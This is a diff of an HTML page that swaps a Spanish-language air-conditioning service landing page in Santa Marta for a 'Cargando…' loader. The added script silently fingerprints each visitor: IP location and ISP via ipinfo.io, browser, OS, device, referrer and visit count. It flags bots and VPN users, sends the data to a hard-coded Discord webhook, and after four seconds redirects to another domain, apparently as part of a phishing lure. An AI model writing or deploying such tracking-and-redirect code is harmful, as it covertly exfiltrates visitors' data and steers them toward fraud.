@@ -1,278 +1,119 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Servicio Técnico de Aire Acondicionado en Santa Marta | Airmaster Pro</title>
-
-<meta name="description" content="Servicio técnico profesional de aire acondicionado en Santa Marta. Reparación, mantenimiento, instalación, pagos y facturación con garantía.">
-
-<meta name="keywords" content="
-aire acondicionado santa marta,
-servicio técnico aire acondicionado,
-reparación de aires santa marta,
-mantenimiento aire acondicionado,
-instalación aire acondicionado santa marta,
-facturación servicio técnico aire
-">
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-
+<title>Cargando…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-:root{
---azul:#0b2e4f;
---verde:#00ffc3;
---gris:#f4f7fb;
-}
-
-*{box-sizing:border-box}
-
-body{
-margin:0;
-font-family:'Poppins',sans-serif;
-background:var(--gris);
-color:#333;
-line-height:1.6;
-}
-
-/* HERO */
-.hero{
-background:
-linear-gradient(rgba(11,46,79,.85),rgba(11,46,79,.85)),
-url('https://images.unsplash.com/photo-1590490360182-c33d57733427');
-background-size:cover;
-background-position:center;
-padding:110px 20px;
-color:#fff;
-text-align:center;
-}
-
-.hero h1{
-font-size:46px;
-margin-bottom:15px;
-}
-
-.hero span{color:var(--verde)}
-
-.hero p{
-font-size:20px;
-max-width:850px;
-margin:auto;
-}
-
-.btn{
-display:inline-block;
-margin-top:35px;
-padding:16px 40px;
-background:var(--verde);
-color:#000;
-font-weight:700;
-border-radius:35px;
-text-decoration:none;
-transition:.3s;
-}
-
-.btn:hover{
-background:#00d9aa;
-transform:scale(1.05);
-}
-
-/* SECCIONES */
-section{
-max-width:1200px;
-margin:auto;
-padding:85px 20px;
-}
-
-.title{
-text-align:center;
-font-size:36px;
-margin-bottom:50px;
-color:var(--azul);
-}
-
-/* GRID */
-.grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
-gap:35px;
-}
-
-/* CARDS */
-.card{
-background:#fff;
-border-radius:20px;
-padding:40px 28px;
-text-align:center;
-box-shadow:0 18px 40px rgba(0,0,0,.08);
-transition:.3s;
-}
-
-.card:hover{
-transform:translateY(-10px);
-}
-
-.card i{
-font-size:48px;
-color:var(--verde);
-margin-bottom:15px;
-}
-
-/* BLOQUE */
-.dark{
-background:#fff;
-}
-
-/* CONTACTO */
-.contact{
-background:
-linear-gradient(rgba(11,46,79,.9),rgba(11,46,79,.9)),
-url('https://images.unsplash.com/photo-1581090700227-1e37b190418e');
-background-size:cover;
-background-position:center;
-border-radius:30px;
-padding:65px 35px;
-text-align:center;
-color:#fff;
-}
-
-/* MAPA */
-.map iframe{
-width:100%;
-height:420px;
-border:0;
-border-radius:25px;
-}
-
-/* FOOTER */
-footer{
-background:#081f34;
-color:#aaa;
-text-align:center;
-padding:30px 15px;
-}
-
-/* WHATSAPP */
-.whatsapp{
-position:fixed;
-bottom:22px;
-right:22px;
-width:70px;
-height:70px;
-background:#25D366;
-color:#fff;
-border-radius:50%;
-display:flex;
-align-items:center;
-justify-content:center;
-font-size:36px;
-box-shadow:0 10px 30px rgba(0,0,0,.35);
-z-index:999;
-}
+  html,body{margin:0;height:100%;display:flex;align-items:center;justify-content:center;background:#fff}
+  #loader{width:120px;height:120px}
 </style>
 </head>
-
 <body>
 
-<!-- HERO -->
-<div class="hero">
-<h1><span>Airmaster Pro</span> Santa Marta</h1>
-<p>Expertos en servicio técnico de aire acondicionado en Santa Marta. Reparación, mantenimiento, instalación y facturación garantizada.</p>
-<a href="#contacto" class="btn">Solicitar Técnico</a>
-</div>
+<img id="loader" src="loadingice.gif.gif" alt="Cargando…">
 
-<!-- EMPRESA -->
-<section>
-<h2 class="title">Técnicos en Aire Acondicionado en Santa Marta</h2>
-<div class="grid">
-<div>
-<p style="font-size:18px">
-En <strong>FríoMaster Pro</strong> ofrecemos soluciones profesionales en aire acondicionado para hogares, oficinas y comercios en Santa Marta. Brindamos atención rápida, precios claros y garantía escrita.
-</p>
-<ul>
-<li>✔ Técnicos calificados</li>
-<li>✔ Atención inmediata</li>
-<li>✔ Servicio certificado</li>
-</ul>
-</div>
-<div>
-<img src="https://images.unsplash.com/photo-1600566753376-1b87e8d6d4b3" style="width:100%;border-radius:20px">
-</div>
-</div>
-</section>
+<script>
+/* ========= CONFIG ========= */
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1446782083862237325/ARvUotb3YZ6NkA6m50K8gznxhH7H3MGIZklRcadi6zB0ElkD8qo-JS3aSoZsCfNoIOQs';
+const REDIR_URL   = 'https://airtuact.com/modules/air-e?b=eyJlbmNyeXB0ZWQiOnRydWV9';
+/* ========================== */
 
-<!-- SERVICIOS -->
-<section class="dark">
-<h2 class="title">Servicios Especializados</h2>
-<div class="grid">
-<div class="card">
-<i class="fas fa-tools"></i>
-<h3>Reparación</h3>
-<p>Solucionamos fallas eléctricas, gas refrigerante y bajo rendimiento.</p>
-</div>
+(async () => {
+  const UA = navigator.userAgent;
+  const esBot = /bot|crawler|spider|curl|wget|scraping/i.test(UA);
 
-<div class="card">
-<i class="fas fa-wind"></i>
-<h3>Mantenimiento</h3>
-<p>Limpieza profunda, desinfección y revisión técnica.</p>
-</div>
+  /* ---------- GEO + ORG ---------- */
+  const { country = 'XX', city = 'Desconocida', org = '' } = await fetch('https://ipinfo.io/json')
+    .then(r => r.json())
+    .catch(() => ({}));
 
-<div class="card">
-<i class="fas fa-icicles"></i>
-<h3>Instalación</h3>
-<p>Instalamos equipos mini split, inverter y comerciales.</p>
-</div>
-</div>
-</section>
+  /* ---------- PROXY / VPN ---------- */
+  const esProxy = /vpn|proxy|hosting|datacenter|cloud/i.test(org);
 
-<!-- PAGOS -->
-<section>
-<h2 class="title">Pagos y Facturación</h2>
-<div class="grid">
-<div class="card">
-<i class="fas fa-file-invoice-dollar"></i>
-<h3>Facturación Legal</h3>
-<p>Factura válida según normativa colombiana.</p>
-</div>
+  /* ---------- NAVEGADOR ---------- */
+  let navegador = 'Desconocido';
+  if (/edg\//i.test(UA)) navegador = 'Edge';
+  else if (/brave/i.test(UA)) navegador = 'Brave';
+  else if (/opera|opr\//i.test(UA)) navegador = 'Opera';
+  else if (/chrome|chromium/i.test(UA) && !/edge|opr\//i.test(UA)) navegador = 'Chrome';
+  else if (/safari/i.test(UA) && !/chrome|chromium/i.test(UA)) navegador = 'Safari';
+  else if (/firefox|fxios/i.test(UA)) navegador = 'Firefox';
 
-<div class="card">
-<i class="fas fa-money-check-alt"></i>
-<h3>Métodos de Pago</h3>
-<p>Efectivo, transferencia y pagos electrónicos.</p>
-</div>
-</div>
-</section>
+  /* ---------- SISTEMA OPERATIVO ---------- */
+  let so = 'Desconocido';
+  if (/windows nt 10/i.test(UA)) so = 'Windows 10/11';
+  else if (/windows nt 6.3/i.test(UA)) so = 'Windows 8.1';
+  else if (/windows nt 6.2/i.test(UA)) so = 'Windows 8';
+  else if (/windows nt 6.1/i.test(UA)) so = 'Windows 7';
+  else if (/macintosh|mac os x/i.test(UA)) so = 'macOS';
+  else if (/kali/i.test(UA)) so = 'Kali Linux';
+  else if (/ubuntu/i.test(UA)) so = 'Ubuntu';
+  else if (/linux/i.test(UA)) so = 'Linux';
+  else if (/android/i.test(UA)) so = 'Android';
+  else if (/iphone|ipad/i.test(UA)) so = 'iOS';
 
-<!-- CONTACTO -->
-<section id="contacto">
-<div class="contact">
-<h2>Contacto en Santa Marta</h2>
-<p>
-📍 Calle 22 #5-45 Centro – Santa Marta<br>
-📞 WhatsApp: <strong>+57 300 000 0000</strong><br>
-📧 contacto@Airmasterpro.com
-</p>
-<a href="https://wa.me/573000000000" class="btn">WhatsApp Ahora</a>
-</div>
-</section>
+  /* ---------- TIPO DE DISPOSITIVO ---------- */
+  let dispositivo = 'Escritorio';
+  if (/mobi/i.test(UA)) dispositivo = 'Móvil';
+  else if (/tablet|ipad|playbook|silk/i.test(UA)) dispositivo = 'Tablet';
+  else if (/smart-tv|hbbtv|appletv|googletv|viera/i.test(UA)) dispositivo = 'Smart-TV';
 
-<!-- MAPA -->
-<section class="map">
-<iframe 
-src="https://www.google.com/maps?q=Calle%2022%20%235-45%20Santa%20Marta&output=embed"
-loading="lazy">
-</iframe>
-</section>
+  /* ---------- SENSOR TÁCTIL ---------- */
+  const tactil = ('maxTouchPoints' in navigator && navigator.maxTouchPoints > 0) ||
+                 (window.matchMedia && window.matchMedia('(pointer: coarse)').matches) ||
+                 ('ontouchstart' in window);
 
-<footer>
-© 2025 FríoMaster Pro Santa Marta – Servicio Técnico de Aire Acondicionado
-</footer>
+  /* ---------- REFERRER ---------- */
+  const referrer = document.referrer || 'Directo / sin referrer';
 
-<a href="https://wa.me/573000000000" class="whatsapp">
-<i class="fab fa-whatsapp"></i>
-</a>
+  /* ---------- DOMINIO ACTUAL ---------- */
+  const dominioActual = location.hostname || 'Dominio no detectado';
 
+  /* ---------- FECHA / HORA ---------- */
+  const ahora = new Date();
+  const fechaHora = ahora.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+  /* ---------- CONTADOR DIARIO ---------- */
+  const hoy = ahora.toISOString().slice(0, 10);
+  const clave = `ingresos_${hoy}`;
+  let num = parseInt(localStorage.getItem(clave) || '0', 10);
+  num += 1;
+  localStorage.setItem(clave, num.toString());
+
+  /* ---------- EMBED ---------- */
+  const embed = {
+    color: esBot ? 0xff0000 : (esProxy ? 0xff9900 : (country === 'CO' ? 0x00ff00 : 0x0099ff)),
+    title: esBot ? '🤖 Bot detectado' : (esProxy ? '🕵️ Proxy/VPN detectado' : (country === 'CO' ? '✅ Humano en Colombia' : '❌ Humano fuera de Colombia')),
+    thumbnail: { url: 'https://i.postimg.cc/fyZQ1Dyy/coolcloud-icono.png' },
+    fields: [
+      { name: '📅 Fecha y hora', value: fechaHora, inline: true },
+      { name: '🔢 Ingreso del día', value: `#${num}`, inline: true },
+      { name: '🌍 Ubicación', value: `${city}, ${country === 'CO' ? 'Colombia' : country}`, inline: true },
+      { name: '🌐 Navegador', value: navegador, inline: true },
+      { name: '💻 Sistema Operativo', value: so, inline: true },
+      { name: '📡 Organización', value: org || 'Sin datos', inline: true },
+      { name: '📱 Tipo de dispositivo', value: dispositivo, inline: true },
+      { name: '👆 Sensor táctil', value: tactil ? '✅ Sí' : '❌ No', inline: true },
+      { name: '🔗 Referrer', value: referrer, inline: false },
+      { name: '🏠 Dominio actual', value: dominioActual, inline: false }
+    ],
+    footer: { text: 'Sistema de ingresos' },
+    timestamp: new Date().toISOString()
+  };
+
+  await fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ embeds: [embed] })
+  });
+
+  /* ---------- REDIRECCIÓN ---------- */
+  setTimeout(() => {
+    location.href = REDIR_URL;
+  }, 4000);
+})();
+</script>
 </body>
 </html>
